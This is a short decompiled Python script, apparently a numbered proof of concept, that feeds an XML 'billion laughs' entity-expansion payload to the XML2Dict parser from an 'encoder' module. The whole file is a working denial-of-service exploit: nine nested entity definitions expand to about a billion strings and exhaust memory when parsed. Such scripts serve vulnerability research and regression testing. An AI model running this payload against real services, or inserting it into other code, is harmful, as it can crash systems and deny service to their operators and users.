# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 423_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 999 bytes
from encoder import XML2Dict
xml2dic = XML2Dict()
doc = ' <!--?xml version="1.0" ?--> <!DOCTYPE bombz [ <!ENTITY bomb "bomb"> <!ELEMENT bombz (#PCDATA)> <!ENTITY bomb1 "&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;"> <!ENTITY bomb2 "&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;&bomb1;"> <!ENTITY bomb3 "&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;"> <!ENTITY bomb4 "&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;"> <!ENTITY bomb5 "&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;&bomb4;"> <!ENTITY bomb6 "&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;&bomb5;"> <!ENTITY bomb7 "&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;&bomb6;"> <!ENTITY bomb8 "&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;&bomb7;"> <!ENTITY bomb9 "&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;&bomb8;"> ]> <bombz>&bomb9;</bombz> '
xml2dic.parse(doc)

# okay decompiling 423_1.pyc
